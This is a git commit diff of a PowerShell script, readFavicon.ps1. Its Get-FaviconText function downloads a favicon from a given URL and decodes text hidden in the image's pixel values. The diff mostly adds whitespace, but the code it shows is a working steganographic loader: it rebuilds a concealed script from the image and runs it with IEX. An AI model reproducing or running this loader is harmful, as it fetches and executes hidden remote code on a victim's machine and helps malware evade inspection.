7e8916f4b69dc1bb144bbd3eaf75358cf626ce64
et0x <scomijo@hotmail.com>
2015-04-24 07:43:50 -0400

    Update readFavicon.ps1

--- readFavicon.ps1
+++ readFavicon.ps1
@@ -1,18 +1,29 @@
 function Get-FaviconText
 {
+    
     Param(
+        
         [string]$URL,
         [string]$WriteTo
+        
         )
+        
     $data = (new-object net.webclient).downloaddata($URL)
+    
     [system.io.file]::writeallbytes("$WriteTo\favicon.ico",$data)
+    
     add-type -path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Drawing.dll"
+    
     $img = [system.drawing.image]::fromfile("$($WriteTo)\favicon.ico")
+    
     $final = ""
+    
     $locIndex = 0
 
     while (1) {
+        
         try{
+            
             if (($img.getpixel($locIndex%32,[math]::floor($locIndex/32)).r) -ne 0) {
                 $final += [convert]::tochar($img.getpixel($locIndex%32,[math]::floor($locIndex/32)).r)
             } else { break }
@@ -26,8 +37,13 @@ function Get-FaviconText
             } else { break }
 
                 $locIndex += 1
+                
         }catch{break}
+        
     }
+    
     $img.dispose()
+    
     IEX($final -join '')
+    
 }
